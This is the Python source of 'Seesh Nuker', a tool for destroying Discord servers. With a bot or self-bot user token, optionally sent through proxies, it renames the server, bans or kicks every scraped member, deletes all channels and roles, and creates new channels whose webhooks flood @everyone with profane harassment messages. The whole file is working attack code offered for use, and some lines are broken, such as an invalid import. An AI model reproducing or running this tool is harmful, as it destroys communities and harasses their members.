import os
from encodings import utf_8
import sys
from importlib import reload
encoding = 'UTF-8',
reload(sys)
os.system("")

print("Checking For All Required Files...")
try:
  from ast import Str
  import discord, requests, sys, time, type-color, random, asyncio, json
  import aiohttp, pypresence
  from asyncio import tasks
  from pypresence import Presence
  from threading import Thread
  from discord.utils import find, get
  from discord.ext import commands
  from time import strftime, gmtime
  from discord import Webhook
  from colorama import Fore, Style
  import httpx
except:
  print("[!] Missing dependencies, please install all dependencies")
  print("Use \x1b[38;5;213mpip install -r requirements.txt\033[37m to install all dependencies")
  print("[!] Exiting...")
  sys.exit()
try:
  if os == "Windows":
    os.system('cls & title [Seesh Nuker] - Starting & mode 69,20') 
except:
    os.system('clear')
    os.system('title [Seesh Nuker] - Starting & mode 69,20')

try:
    with open('data/config.json') as f:
        config = json.load(f)
except:
    with open('data/config.json', 'w') as f:
        print("\n\033[91m>\033[39m Config file not found, creating one")
        token = input("\n\033[91m>\033[39m Enter your token: ")
        prefix = input("\n\033[91m>\033[39m Enter your prefix: ")
        nuke_name = input("\n\033[91m>\033[39m Enter your nuked by: ")
        invite_link = input("\n\033[91m>\033[39m Enter your Spam Invite Link: ")
        json.dump({"Token": token,
    "Prefix": prefix,
    "Channel-Names": [nuke_name+" was here", nuke_name+" ruined you"], 
	"Server-Names": [nuke_name+" destroyed you"],
	"Role-Names": [nuke_name+" was here", nuke_name+" ruined you"],
	"Reason": ["beamed by "+nuke_name, nuke_name+" fucked me"],
	"Spam": True,
	"Webhook-Names": [nuke_name+" was here", "get beamed by "+nuke_name],
    "name": nuke_name,
	"Spam-Messages": "@everyone "+nuke_name+" WIZZED YOU",
    "Spam-Invite": '@everyone fuck you '+invite_link,
	"Spam-Amount": 10000}, f, indent=4)
    input("\n\033[91m>\033[39m Press Enter To Proceed")
    pass
proxy = None
with open('data/config.json') as f:
    config = json.load(f)
token = config.get('Token')

prefix = config.get('Prefix')
proxyask = input("\n\033[91m>\033[39m Do you want to use proxy? (1) Yes (2) No: ")
if proxyask == "1":
    print("\033[91m>\033[39m Proxy Enabled")
    with open ('data/proxies.txt', 'r') as f:
        proxies = f.read().splitlines()
        proxy1 = random.choice(proxies)
        proxy = {'http': proxy1, 'https': proxy1}

channel_names = config.get('Channel-Names')
server_names = config.get('Server-Names')
role_names = config.get('Role-Names')
reason = config.get('Reason')
name = config.get('name')
spam = config.get('Spam')
invilink = config.get('Spam-Invite')
webhook_names = config.get('Webhook-Names')
spam_messages = config.get('Spam-Messages')
spam_amount = config.get('Spam-Amount')
Ban_Whitelist = config.get('Ban_Whitelist')

def check_token(token: str) -> str:
    if requests.get("https://discord.com/api/v10/users/@me", headers={"Authorization": token}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token(token)

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=True)
else:
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=prefix, case_insensitive=False, self_bot=False, intents=discord.Intents().all())
client.remove_command("help")

async def memberids(guildID):
    try:
            guild = client.get_guild(guildID)
    except:
        print("\033[91m>\033[39m Invalid Guild ID")
        await menu()

    try:
        os.remove("Scraped/members.txt")
    except:
        pass
    membercount = 0
    with open('Scraped/members.txt', 'a') as f:
        for member in guild.members:
            membercount += 1
            f.write(str(member.id) + "\n")
        print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Scraped \x1b[38;5;213m{membercount}\033[37m Members")

async def roleids(guildID):
    try:
            guild = client.get_guild(guildID)
    except:
        print("\033[91m>\033[39m Invalid Guild ID")
        await menu()

    try:
        os.remove("Scraped/roles.txt")
    except:
        pass
    rolecount = 0
    with open('Scraped/roles.txt', 'a') as f:
        for role in guild.roles:
            rolecount += 1
            f.write(str(role.id) + "\n")
        print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Scraped \x1b[38;5;213m{rolecount}\033[37m Roles")  

async def channelids(guildID):
    try:
            guild = client.get_guild(guildID)
    except:
        print("\033[91m>\033[39m Invalid Guild ID")
        await menu()

    try:
        os.remove("Scraped/channels.txt")
    except:
        pass
    channelcount = 0
    with open('Scraped/channels.txt', 'a') as f:
        for channel in guild.channels:
            channelcount += 1
            f.write(str(channel.id) + "\n")
        print(f"\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Scraped \x1b[38;5;213m{channelcount}\033[37m Channels")    
class Seesh:

    def Name(guild):
        try:

            json = {
                'name': random.choice(server_names),
            }
            r = requests.patch(f'https://discord.com/api/v10/guilds/{guild}', headers=headers, json=json)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Renamed Guild To\x1b[38;5;213m {json['name']}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Rename Guild\x1b[38;5;213m {json['name']}\x1b[38;5;15")
        except:
            pass

    def CreateWebhook(channel):
        try:
            json = {
                'name': random.choice(webhook_names),
            }
            r = requests.post(f'https://discord.com/api/v10/channels/{channel}/webhooks', headers=headers, json=json, proxies=proxy)
            web_id = r.json()['id']
            web_token = r.json()['token']
            return f'https://discord.com/api/webhooks/{web_id}/{web_token}'
        except:
            pass

    def SendWebhook(webhook):
        try:
            for i in range(spam_amount):
                randcolor = random.randint(0, 16777215)
                data = {
            'content':
            invilink,
            'embeds': [{
                'title':
                'fucked by your dad',
                'tts':
                'true',
                'description':
                '.',
                'url':
                "https://discord.gg/seesh",
                'color':
                randcolor,
                'fields': [{
                    'name': spam_messages,
                    'value': '.'
                }, {
                    'name': spam_messages,
                    'value': '.'
                }, {
                    'name': spam_messages,
                    'value': '.'
                }, {
                    'name': spam_messages,
                    'value': '.'
                }],
                'author': {
                    'name':
                    'Seesh fucks you',
                    'url':
                    'https://media.discordapp.net/attachments/1005729774351691776/1014038921002373150/a_18520f6f7947e5acfdffe8e63b748c2e.gif?width=221&height=221',
                    'icon_url':
                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
                },
                'footer': {
                    'text':
                     spam_messages,
                    'icon_url':
                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
                },
                'image': {
                    'url':
                    'https://media.discordapp.net/attachments/1005729774351691776/1014038921002373150/a_18520f6f7947e5acfdffe8e63b748c2e.gif?width=221&height=221'
                },
                'thumbnail': {
                    'url':
                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
                }
            }, {
                'url':
                'https://media.discordapp.net/attachments/1005729774351691776/1014038921002373150/a_18520f6f7947e5acfdffe8e63b748c2e.gif?width=221&height=221',
                'image': {
                    'url':
                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
                }
            }, {
                'url':
                'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162',
                'image': {
                    'url':
                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
                }
            }, {
                'url': 'https://discord.gg/seesh',
                'image': {
                    'url':
                    'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
                }
            }],
            'username':
            'Seesh Ruins You',
            'avatar_url':
            'https://media.discordapp.net/attachments/1005729774351691776/1014038919836336198/a_04d536f4606dd36b6d154ede2401e8e1.gif?width=405&height=162'
        }
                spaming = requests.post(webhook, json=data, proxies=proxy)
                spammingerror = spaming.text
                if spaming.status_code == 200 or spaming.status_code == 204:
                    continue
                if 'rate limited' in spammingerror.lower():
                    try:
                        j = json.loads(spammingerror)
                        ratelimit = j['retry_after']
                        timetowait = ratelimit / 1000
                        time.sleep(timetowait)
                    except:
                        delay = random.randint(5, 10)
                        time.sleep(delay)
                else:
                    delay = random.randint(30, 60)
                    time.sleep(delay)
        except Exception as e:
            print(f"\x1b[38;5;196m[\033[37m+\x1b[38;5;196m]\033[37m Error: {e}")
            pass
    def Ban(guild, member):
        try:
            r = requests.put(f'https://discord.com/api/v10/guilds/{guild}/bans/{member}', headers=headers, proxies=proxy)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Banned \x1b[38;5;113m{member}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Ban\x1b {Fore.LIGHTRED_EX} {member.strip()}\x1b[38;5;15 ")
        except:
            pass
    def Kick(guild, member):
        try:
            r = requests.delete(f'https://discord.com/api/v10/guilds/{guild}/members/{member}', headers=headers, proxies=proxy)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Kicked\x1b[38;5;113m {member.strip()}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Kick\x1b{Fore.LIGHTRED_EX} {member.strip()}\x1b[38;5;15")
        except:
            pass

    def DelChannel(guild, channel):
        try:
            r = requests.delete(f'https://discord.com/api/v10/channels/{channel}', headers=headers, proxies=proxy)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Deleted Channel\x1b[38;5;113m {channel.strip()}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Delete Channel\x1b{Fore.LIGHTRED_EX} {channel.strip()}\x1b[38;5;15")
        except:
            pass

    def CreateChannel(guild):
        try:
            json = {
                'name': random.choice(channel_names),
                'type': 0
            }
            r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/channels', headers=headers, json=json, proxies=proxy)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Created Channel\x1b[38;5;113m {json['name']}\x1b[38;5;15")
                if spam == True:
                    webhook = Seesh.CreateWebhook(r.json()['id'])
                    Thread(target=Seesh.SendWebhook, args=(webhook,)).start()
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Create Channel\x1b{Fore.LIGHTRED_EX} {json['name']}\x1b[38;5;15")
        except:
            pass

    def DelRole(guild, role):
        try:
            r = requests.delete(f'https://discord.com/api/v10/guilds/{guild}/roles/{role}', headers=headers, proxies=proxy)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Deleted Role\x1b[38;5;113m {role.strip()}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Delete Role\x1b{Fore.LIGHTRED_EX} {role.strip()}\x1b[38;5;15")
        except:
            pass
    def CreateRole(guild):

        try:
            json = {
                'hoist': 'true',
                'name': random.choice(role_names),
                'mentionable': 'true',
                'color': random.randint(1000000,9999999),
                'permissions': random.randint(1,10)
            }
            r = requests.post(f'https://discord.com/api/v10/guilds/{guild}/roles', headers=headers, json=json, proxies=proxy)
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                print(f"\x1b[38;5;213m[\033[37m+\x1b[38;5;213m]\033[37m Created Role\x1b[38;5;113m {json['name']}\x1b[38;5;15")
            else:
                print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Couldn't Create Role\x1b{Fore.LIGHTRED_EX}{json['name']}\x1b[38;5;15")
        except:
            pass

async def menu():
    os.system(f'cls & mode 85,20 & title [Seesh Nuker] - Connected: {client.user}')
    print(f'''{Fore.LIGHTRED_EX}
░██████╗███████╗███████╗░██████╗██╗░░██╗
██╔════╝██╔════╝██╔════╝██╔════╝██║░░██║
╚█████╗░█████╗░░█████╗░░╚█████╗░███████║
░╚═══██╗██╔══╝░░██╔══╝░░░╚═══██╗██╔══██║
██████╔╝███████╗███████╗██████╔╝██║░░██║
╚═════╝░╚══════╝╚══════╝╚═════╝░╚═╝░░╚═╝
{Style.BRIGHT}''')
    print(f'''{Fore.RED} Choose Your Option Below :- {Style.BRIGHT}''')
    print(f'\033[37m[\x1b[38;5;113m1\033[37m] \033[37m Ban Members     \x1b[38;5;213m')
    print(f'\033[37m[\x1b[38;5;113m2\033[37m] \033[37m Kick Members    \x1b[38;5;213m')
    print(f'\033[37m[\x1b[38;5;113m3\033[37m] \033[37m Prune Members   \x1b[38;5;213m')
    print(f'\033[37m[\x1b[38;5;113m4\033[37m] \033[37m Delete Channels \x1b[38;5;213m')
    print(f'\033[37m[\x1b[38;5;113m5\033[37m] \033[37m Create Channels \x1b[38;5;213m')
    print(f'\033[37m[\x1b[38;5;113m6\033[37m] \033[37m Nuke     \x1b[38;5;213m')
    choice = input("\x1b[38;5;213m> \033[37mChoice\x1b[38;5;213m: \033[37m")
    if choice > '6' or choice < '1':
        print(f"\x1b[38;5;213m[\033[37m-\x1b[38;5;213m]\033[37m Invalid Choice\x1b[38;5;15")
        await menu()
    if choice == "1":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:
            guild = client.get_guild(guildID)
            await memberids(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\n\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Starting Ban Process')
        mainMembers = []
        num = 0
        
        with open("Scraped/members.txt", "r") as f:
            ids = f.readlines()

            for id in ids:
                mainMembers.append(id)

        members_1 = []
        members_2 = []
        members_3 = []
        total = len(mainMembers)
        members_per_arrary = round(total/3)
        
        for member in mainMembers:
            if len(members_1) != members_per_arrary:
                members_1.append(member)
            else:
                if len(members_2) != members_per_arrary:
                    members_2.append(member)
                else:
                    if len(members_3) != members_per_arrary:
                        members_3.append(member)
                    else:
                        pass
        while True:
            #try:
            Thread(target=Seesh.Ban, args=(guild.id, members_1[num],)).start()
            Thread(target=Seesh.Ban, args=(guild.id, members_2[num],)).start()
            Thread(target=Seesh.Ban, args=(guild.id, members_3[num],)).start()
            num += 1
            #except IndexError:
                #break
            #except:
                #pass

        time.sleep(2)
        await menu()
    if choice == "2":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:
            guild = client.get_guild(guildID)
            await memberids(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\n\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Starting Kick Process')
        
        mainMembers = []
        num = 0
        
        with open("Scraped/members.txt", "r") as f:
            ids = f.readlines()

            for id in ids:
                mainMembers.append(id)

        members_1 = []
        members_2 = []
        members_3 = []
        total = len(mainMembers)
        members_per_arrary = round(total/3)
        
        for member in mainMembers:
            if len(members_1) != members_per_arrary:
                members_1.append(member)
            else:
                if len(members_2) != members_per_arrary:
                    members_2.append(member)
                else:
                    if len(members_3) != members_per_arrary:
                        members_3.append(member)
                    else:
                        pass
        while True:
            #try:
                Thread(target=Seesh.Kick, args=(guild.id, members_1[num],)).start()
                Thread(target=Seesh.Kick, args=(guild.id, members_2[num],)).start()
                Thread(target=Seesh.Kick, args=(guild.id, members_3[num],)).start()
                num += 1
            #except IndexError:
               # break
            #except:
              #  pass

        time.sleep(2)
        await menu()

    if choice == "3":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Starting Prune Process')
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles[100])
        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Prune Process Complete')
        await menu()

    if choice == "4":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:    
            guild = client.get_guild(guildID)
            await channelids(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Deleting Channels..')
        
        cnum = 0
        channels = []

        with open("Scraped/channels.txt", "r") as f:
            cids = f.readlines()

            for id in cids:
                channels.append(id)

        while True:
            try:
                Thread(target=Seesh.DelChannel, args=(guild.id, channels[cnum],)).start()
                cnum += 1
            except IndexError:
                break
            except:
                pass

        time.sleep(2)
        await menu()


    if choice == "5":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        channel_amount = int(input("\x1b[38;5;213m> \033[37mAmount\x1b[38;5;213m: \033[37m"))
        try:    
            guild = client.get_guild(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Creating Channels..')
        

        for i in range(channel_amount):
            Thread(target=Seesh.CreateChannel, args=(guild.id,)).start()
        
        time.sleep(2)
        await menu()
    if choice == "6":
        guildID = int(input("\x1b[38;5;213m> \033[37mGuild ID\x1b[38;5;213m: \033[37m"))
        try:    
            guild = client.get_guild(guildID)
            await channelids(guildID)
            await memberids(guildID)
            await roleids(guildID)
        except:
            print("\033[91m>\033[39m Invalid Guild ID")
            await menu()

        print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Starting Nuke Process')
        
        mainMembers = []
        num = 0
        with open("Scraped/members.txt", "r") as f:
            ids = f.readlines()
            for id in ids:
                mainMembers.append(id)

        members_1 = []
        members_2 = []
        members_3 = []
        total = len(mainMembers)
        members_per_arrary = round(total/3)
        
        for member in mainMembers:
            if len(members_1) != members_per_arrary:
                members_1.append(member)
            else:
                if len(members_2) != members_per_arrary:
                    members_2.append(member)
                else:
                    if len(members_3) != members_per_arrary:
                        members_3.append(member)
                    else:
                        pass
        Seesh.Name(guild.id)
        while True:
            try:
                Thread(target=Seesh.Ban, args=(guild.id, members_1[num],)).start()
                Thread(target=Seesh.Ban, args=(guild.id, members_2[num],)).start()
                Thread(target=Seesh.Ban, args=(guild.id, members_3[num],)).start()
                num += 1
            except IndexError:
                break
            except:
                pass
        cnum = 0
        channels = []

        with open("Scraped/channels.txt", "r") as f:
            cids = f.readlines()

            for id in cids:
                channels.append(id)

        while True:
            try:
                Thread(target=Seesh.DelChannel, args=(guild.id, channels[cnum],)).start()
                cnum += 1
            except IndexError:
                break
            except:
                pass
        channel_amount = 50
        for i in range(channel_amount):
            Thread(target=Seesh.CreateChannel, args=(guild.id,)).start()
        await time.sleep(2)
        await menu()
    await asyncio.wait([menu()])
        



try:
    RPC = Presence(client.user.id)
    RPC.connect() 

    RPC.update(details="Main Menu", large_image="Seesh", small_image="Seesh", large_text="Seesh Nuker", start=time.time())
except:
    pass
@client.event
async def on_ready():
    if token_type == "bot":
        try:
            print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Logged in as {client.user.name}')
            await menu()
        except:
            pass
@client.event
async def on_connect():
    if token_type == "user":
        try:
            print(f'\x1b[38;5;213m[\033[37m!\x1b[38;5;213m]\033[37m Logged in')
            await menu()
        except:
            pass
@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        pass

def Startup():
    if token_type == "user":
        try:
            client.run(token, bot=False)
        except:
            print(f"\n\033[91m>\033[39m Invalid Token")
            input()
            os._exit(0)

    elif token_type == "bot":
        try:
            client.run(token)
        except:
            print(f"\n\033[91m>\033[39m Invalid Token")
            print(f"\n\033[91m>\033[39m Make sure to enable all intents")
            input()
            os._exit(0)
    else:
        os._exit(0)

if __name__ == "__main__":
    Startup()
